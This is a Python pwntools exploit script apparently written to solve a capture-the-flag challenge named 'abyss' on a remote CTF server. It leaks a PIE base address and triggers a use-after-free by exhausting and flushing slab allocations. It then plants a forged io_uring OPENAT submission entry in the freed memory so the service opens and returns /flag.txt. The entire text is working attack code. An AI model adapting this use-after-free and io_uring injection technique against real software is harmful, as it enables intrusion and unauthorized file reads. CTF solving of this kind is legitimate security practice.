#!/usr/bin/env python3
from pwn import *
import struct
import time
import re

context.log_level = 'info'

LOCAL = args.LOCAL
if LOCAL:
    r = process('./abyss')
else:
    r = remote('chals1.apoorvctf.xyz', 16001)

def cmd(s):
    r.sendline(s.encode() if isinstance(s, str) else s)

def prompt():
    return r.recvuntil(b'depth> ')

prompt()

# Step 1: Exhaust dive_slab (16 entries) and levi_slab (16 entries)
for i in range(16):
    cmd(f'DIVE {i}')
    prompt()

# Leak PIE base from dive 0
cmd('STATUS 0')
resp = prompt().decode()
m = re.search(r'addr=0x([0-9a-f]+)', resp)
dive0_addr = int(m.group(1), 16)
pie_base = dive0_addr - 0x6920
flagname_addr = pie_base + 0x6010
log.info(f'PIE base = {hex(pie_base)}')
log.info(f'/flag.txt @ {hex(flagname_addr)}')

# Exhaust levi_slab
for i in range(16):
    cmd(f'BEACON {i}')
    prompt()

# Step 2: FLUSH all dives (frees to dive_slab, g_dive_reg preserved = UAF)
cmd('FLUSH')
prompt()
time.sleep(1.5)

# Step 3: BEACON 16 allocates from dive_slab, gets dive 0's memory
cmd('BEACON 16')
resp = prompt().decode()
m = re.search(r'addr=0x([0-9a-f]+)', resp)
beacon_addr = int(m.group(1), 16)
log.info(f'BEACON 16 @ {hex(beacon_addr)}')

# Find matching dive slot
uaf_slot = -1
for i in range(16):
    cmd(f'STATUS {i}')
    resp = prompt().decode()
    m2 = re.search(r'addr=0x([0-9a-f]+)', resp)
    if m2 and int(m2.group(1), 16) == beacon_addr:
        uaf_slot = i
        log.success(f'UAF: dive {i} == BEACON 16 @ {hex(beacon_addr)}')
        break
    elif 'ERR' in resp:
        continue

if uaf_slot == -1:
    log.error('No UAF match found')

# Step 4: Write OPENAT SQE via DESCEND on the UAF dive
sqe = bytearray(64)
sqe[0] = 0x12  # IORING_OP_OPENAT
struct.pack_into('<i', sqe, 4, -100)            # fd = AT_FDCWD
struct.pack_into('<Q', sqe, 16, flagname_addr)   # addr -> "/flag.txt"
sqe_hex = sqe.hex()

cmd(f'DESCEND {uaf_slot} 0 {sqe_hex}')
resp = prompt()
log.info(f'DESCEND: {resp.strip()}')

# Step 5: ABYSS 16 -> benthic submits our SQE, opens /flag.txt, reads flag
cmd(f'ABYSS 16')

# Collect output
try:
    data = r.recvuntil(b'depth> ', timeout=5)
    output = data.decode(errors='replace')
    print(output)
    if 'FLAG:' in output:
        flag_match = re.search(r'FLAG:\s*(.*)', output)
        if flag_match:
            flag = flag_match.group(1).strip()
            log.success(f'FLAG: {flag}')
            with open('flag.txt', 'w') as f:
                f.write(flag)
except:
    data = r.recv(timeout=5)
    output = data.decode(errors='replace')
    print(output)

r.close()
